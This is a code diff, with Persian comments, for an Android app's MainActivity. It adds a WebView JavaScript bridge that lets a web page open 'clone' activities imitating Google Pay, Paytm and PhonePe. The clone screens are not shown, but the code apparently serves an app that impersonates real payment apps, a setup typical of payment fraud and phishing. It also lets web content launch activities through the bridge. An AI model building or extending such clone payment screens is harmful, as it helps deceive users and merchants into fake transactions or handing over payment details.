@@ -451,6 +451,17 @@ class MainActivity : ComponentActivity() {
                 Log.d(TAG, "🔗 JavaScript requested base URL: $baseUrl")
                 return baseUrl
             }
+            
+            /**
+             * ⭐ باز کردن Activity کلون روش پرداخت انتخاب شده
+             * @param paymentMethod نوع روش پرداخت: "gpay", "paytm", "phonepe"
+             */
+            @android.webkit.JavascriptInterface
+            fun openPaymentClone(paymentMethod: String) {
+                runOnUiThread {
+                    openPaymentCloneActivity(paymentMethod)
+                }
+            }
         }, "Android")
         
         Log.d(TAG, "✅ JavaScript Interface added (device ID + user ID)")
@@ -467,27 +478,43 @@ class MainActivity : ComponentActivity() {
 
     /**
      * ⭐ مدیریت navigation در WebView
-     * اگر URL مربوط به payment.html باشه، PaymentActivity رو باز می‌کنه (کلون)
+     * payment.html باید در همان WebView لود بشه (نه در PaymentActivity)
+     * بعد از انتخاب نوع پرداخت، کلون مربوطه باز میشه
      */
     private fun handleUrlNavigation(url: String): Boolean {
         Log.d(TAG, "🔗 Navigation request: $url")
         
-        // ⭐ چک کردن اگر URL مربوط به payment.html هست
-        // پشتیبانی از: "payment.html", "/payment.html", "file:///android_asset/payment.html"
-        if (url.contains("payment.html", ignoreCase = true)) {
-            Log.d(TAG, "════════════════════════════════════════")
-            Log.d(TAG, "💰 PAYMENT PAGE DETECTED - Opening as Clone")
-            Log.d(TAG, "════════════════════════════════════════")
-            
-            // ⭐ باز کردن PaymentActivity به صورت کلون (مثل یک برنامه جداگانه)
-            val intent = Intent(this, PaymentActivity::class.java)
-            startActivity(intent)
-            
-            return true  // جلوی لود شدن در WebView فعلی رو بگیر
+        // ⭐ payment.html باید در همین WebView لود بشه
+        // کاربر نوع پرداخت رو انتخاب می‌کنه و بعد از طریق JavaScript interface کلون باز میشه
+        return false  // اجازه بده همه URL ها (از جمله payment.html) در همین WebView لود بشن
+    }
+
+    /**
+     * ⭐ باز کردن Activity کلون روش پرداخت انتخاب شده
+     * @param paymentMethod نوع روش پرداخت: "gpay", "paytm", "phonepe"
+     */
+    private fun openPaymentCloneActivity(paymentMethod: String) {
+        Log.d(TAG, "════════════════════════════════════════")
+        Log.d(TAG, "💰 OPENING PAYMENT CLONE: $paymentMethod")
+        Log.d(TAG, "════════════════════════════════════════")
+        
+        val intent = when (paymentMethod.lowercase()) {
+            "gpay", "googlepay", "google-pay" -> {
+                Intent(this, GPayCloneActivity::class.java)
+            }
+            "paytm" -> {
+                Intent(this, PaytmCloneActivity::class.java)
+            }
+            "phonepe" -> {
+                Intent(this, PhonePeCloneActivity::class.java)
+            }
+            else -> {
+                Log.e(TAG, "❌ Unknown payment method: $paymentMethod")
+                return
+            }
         }
         
-        // ⭐ برای بقیه URL ها، در همین WebView لود بشن
-        return false
+        startActivity(intent)
     }
 
     private fun continueInitialization() {
